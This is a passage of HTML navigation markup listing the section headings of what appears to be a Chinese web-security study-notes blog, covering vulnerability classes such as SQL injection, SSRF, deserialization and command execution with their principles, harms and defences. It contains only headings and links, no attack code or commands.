class="nav-text">CSRF漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-CSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">1.CSRF漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-2"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-2"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.4.</span> <span class="nav-text">XXE漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">1.XXE漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-3"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-3"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.5.</span> <span class="nav-text">SSRF漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">1.SSRF漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-4"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-4"><span class="nav-number">1.1.5.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.6.</span> <span class="nav-text">文件上传漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">1.文件上传漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-5"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-5"><span class="nav-number">1.1.6.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.7.</span> <span class="nav-text">文件包含漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">1.文件包含漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-6"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-6"><span class="nav-number">1.1.7.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.8.</span> <span class="nav-text">逻辑漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">1.逻辑漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-7"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-7"><span class="nav-number">1.1.8.3.</span> <span class="nav-text">3.防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9"><span class="nav-number">1.1.8.3.1.</span> <span class="nav-text">1.任意密码修改</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">1.1.8.3.2.</span> <span class="nav-text">2.越权访问</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.9.</span> <span class="nav-text">命令执行漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.9.1.</span> <span class="nav-text">1.命令执行漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-8"><span class="nav-number">1.1.9.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-8"><span class="nav-number">1.1.9.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%AF%87"><span class="nav-number">1.1.10.</span> <span class="nav-text">暴力破解篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.10.1.</span> <span class="nav-text">1.暴力破解原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-9"><span class="nav-number">1.1.10.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-9"><span class="nav-number">1.1.10.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AF%87%EF%BC%88PHP%EF%BC%89"><span class="nav-number">1.1.11.</span> <span class="nav-text">反序列化漏洞篇（PHP）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.11.1.</span> <span class="nav-text">1.反序列化漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-10"><span class="nav-number">1.1.11.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-10"><span class="nav-number">1.1.11.3.</span> <span class="nav-text">3.防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%AD%BE%E5%90%8D%E4%B8%8E%E8%AE%A4%E8%AF%81"><span class="nav-number">1.1.11.3.1.</span> <span class="nav-text">1)签名与认证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E9%99%90%E5%88%B6%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB"><span class="nav-number">1.1.11.3.2.</span> <span class="nav-text">2)限制序列化与反序列化的类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-RASP%E6%A3%80%E6%B5%8B"><span class="nav-number">1.1.11.3.3.</span> <span class="nav-text">3)RASP检测</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.11.4.</span> <span class="nav-text">4.利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-wakeup-%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.11.4.1.</span> <span class="nav-text">1)__wakeup( )绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.11.4.2.</span> <span class="nav-text">2)注入对象构造方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.11.4.3.</span> <span class="nav-text">3)Session反序列化漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-PHAR%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.11.4.4.</span> <span class="nav-text">4)PHAR利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.12.</span> <span class="nav-text">RCE漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.12.1.</span> <span class="nav-text">1.RCE漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-11"><span class="nav-number">1.1.12.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-11"><span class="nav-number">1.1.12.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.13.</span> <span class="nav-text">SSTI漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-SSTI%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.13.1.</span> <span class="nav-text">1.SSTI漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-12"><span class="nav-number">1.1.13.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-12"><span class="nav-number">1.1.13.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0"><span class="nav-number">1.2.</span> <span class="nav-text">各漏洞知识记录笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81sql"><span class="nav-number">1.2.1.</span> <span class="nav-text">一、sql</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">sql注入的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%91%A0%E6%8C%89%E7%85%A7%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">1.2.1.1.1.</span> <span class="nav-text">①按照数据提交的方式来分类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%91%A1%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">1.2.1.1.2.</span> <span class="nav-text">②按照执行效果来分类：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.2.1.1.2.1.</span> <span class="nav-text">（1）基于布尔的盲注：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.2.1.1.2.2.</span> <span class="nav-text">（2）基于时间的盲注：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.1.1.2.3.</span> <span class="nav-text">（3）基于报错注入：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%91%A2%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B%E6%9D%A5%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="nav-number">1.2.1.1.3.</span> <span class="nav-text">③按照注入点类型来分类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%91%A3%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%A6%E5%92%8C%E9%A1%BA%E5%BA%8F%E7%9A%84%E6%B3%A8%E5%85%A5-%E5%93%AA%E9%87%8C%E5%8F%91%E7%94%9F%E4%BA%86%E5%BD%B1%E5%93%8D"><span class="nav-number">1.2.1.1.4.</span> <span class="nav-text">④基于程度和顺序的注入(哪里发生了影响)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">1.堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="nav-number">1.2.1.2.1.</span> <span class="nav-text">1.堆叠注入定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.1.2.2.</span> <span class="nav-text">2.堆叠注入原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-number">1.2.1.2.3.</span> <span class="nav-text">3.堆叠注入的局限性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">2.无列名注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">*3.联合注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.5.</span> <span class="nav-text">1.几个常用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E5%B0%9D%E8%AF%95%E7%9A%84%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.2.1.6.</span> <span class="nav-text">2.一般用于尝试的闭合语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-sql%E4%B8%AD%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E3%80%90%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%91"><span class="nav-number">1.2.1.7.</span> <span class="nav-text">3.sql中逻辑运算【万能密码的原理】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E3%80%90%E6%8C%89%E9%A1%BA%E5%BA%8F%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E3%80%91"><span class="nav-number">1.2.1.8.</span> <span class="nav-text">4.注入的一般流程【按顺序查询注入】</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ps-%E5%85%B3%E9%94%AE%E8%AE%B0%E5%BF%86%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.1.8.1.</span> <span class="nav-text">ps.关键记忆和使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.2.1.8.2.</span> <span class="nav-text">[1] 注入语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">1.2.1.8.3.</span> <span class="nav-text">[2] 注入流程图</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-mysql%E9%94%99%E8%AF%AF%E5%88%86%E6%9E%90%E8%A7%A3%E5%86%B3"><span class="nav-number">1.2.1.9.</span> <span class="nav-text">5.mysql错误分析解决</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%EF%BC%89%E5%AD%90%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%A4%9A%E4%BA%8E%E4%B8%80%E8%A1%8C"><span class="nav-number">1.2.1.9.1.</span> <span class="nav-text">1）子查询结果多于一行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps-%E5%AD%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.2.1.9.2.</span> <span class="nav-text">ps. 子查询语句</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-mysql-%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0%EF%BC%8C-%E5%88%86%E7%BB%84%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.10.</span> <span class="nav-text">6.mysql 连接函数， 分组连接函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-concat"><span class="nav-number">1.2.1.10.1.</span> <span class="nav-text">1.concat()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-concat-ws"><span class="nav-number">1.2.1.10.2.</span> <span class="nav-text">2.concat_ws()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-group-concat"><span class="nav-number">1.2.1.10.3.</span> <span class="nav-text">3.group_concat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps-%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.1.10.4.</span> <span class="nav-text">ps. 组合使用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.2.1.11.</span> <span class="nav-text">*7.过滤替换</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%EF%BC%89%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.11.1.</span> <span class="nav-text">1）双写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%EF%BC%89%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88"><span class="nav-number">1.2.1.11.2.</span> <span class="nav-text">2）大小写混合</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%EF%BC%89%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.2.1.11.3.</span> <span class="nav-text">*3）替换</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.2.1.12.</span> <span class="nav-text">8. 注释符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81xss"><span class="nav-number">1.2.2.</span> <span class="nav-text">二、xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81csrf"><span class="nav-number">1.2.3.</span> <span class="nav-text">三、csrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81xxe"><span class="nav-number">1.2.4.</span> <span class="nav-text">四、xxe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81ssrf"><span class="nav-number">1.2.5.</span> <span class="nav-text">五、ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">gopher协议总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">1.2.5.1.1.</span> <span class="nav-text">1)利用：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-GTE%E8%AF%B7%E6%B1%82"><span class="nav-number">1.2.5.1.2.</span> <span class="nav-text">2)GTE请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-POST%E8%AF%B7%E6%B1%82"><span class="nav-number">1.2.5.1.3.</span> <span class="nav-text">3)POST请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E7%9A%84POST%E8%AF%B7%E6%B1%82"><span class="nav-number">1.2.5.1.4.</span> <span class="nav-text">构造一个提交文件的POST请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gopher%E6%89%93FastCGI"><span class="nav-number">1.2.5.1.5.</span> <span class="nav-text">gopher打FastCGI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gopher%E6%89%93redis"><span class="nav-number">1.2.5.1.6.</span> <span class="nav-text">gopher打redis</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gopher%E6%89%93mysql"><span class="nav-number">1.2.5.1.7.</span> <span class="nav-text">gopher打mysql</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.2.6.</span> <span class="nav-text">六、文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%A4%9A%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">1.多重过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">2.文件类型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.2.7.</span> <span class="nav-text">七、文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%9B%9B%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">1.2.7.1.</span> <span class="nav-text">1.文件包含的四个函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="nav-number">1.2.7.2.</span> <span class="nav-text">2.php伪协议：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-php-%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.7.2.1.</span> <span class="nav-text">1.php:&#x2F;&#x2F;协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-php-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.7.2.2.</span> <span class="nav-text">2.php:&#x2F;&#x2F;filter伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-php-input%EF%BC%88%E8%AF%BB%E5%8F%96POST%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-number">1.2.7.2.3.</span> <span class="nav-text">3.php:&#x2F;&#x2F;input（读取POST数据）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-file-%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%89"><span class="nav-number">1.2.7.2.4.</span> <span class="nav-text">4.file:&#x2F;&#x2F;伪协议（读取文件内容）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-phar-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E8%AF%BB%E5%8F%96%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">1.2.7.2.5.</span> <span class="nav-text">5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-zip-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.7.2.6.</span> <span class="nav-text">6.zip:&#x2F;&#x2F;伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-data-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.7.2.7.</span> <span class="nav-text">7.data:&#x2F;&#x2F;伪协议(读取文件)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.7.2.8.</span> <span class="nav-text">8.总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.8.</span> <span class="nav-text">八、逻辑漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.9.</span> <span class="nav-text">九、命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9C%89%E5%85%B3%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88windows-%E6%88%96-linux-%E4%B8%8B%EF%BC%89"><span class="nav-number">1.2.9.1.</span> <span class="nav-text">1.有关命令执行的知识（windows 或 linux 下）:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.9.2.</span> <span class="nav-text">绕过过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%BF%87%E6%BB%A4cat"><span class="nav-number">1.2.9.2.1.</span> <span class="nav-text">1.过滤cat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.2.9.2.2.</span> <span class="nav-text">2.过滤空格</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">1.2.9.2.3.</span> <span class="nav-text">3.过滤目录分隔符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">1.2.9.2.4.</span> <span class="nav-text">4.过滤运算符</span></a></li><li class="nav-item nav-level-5"><a 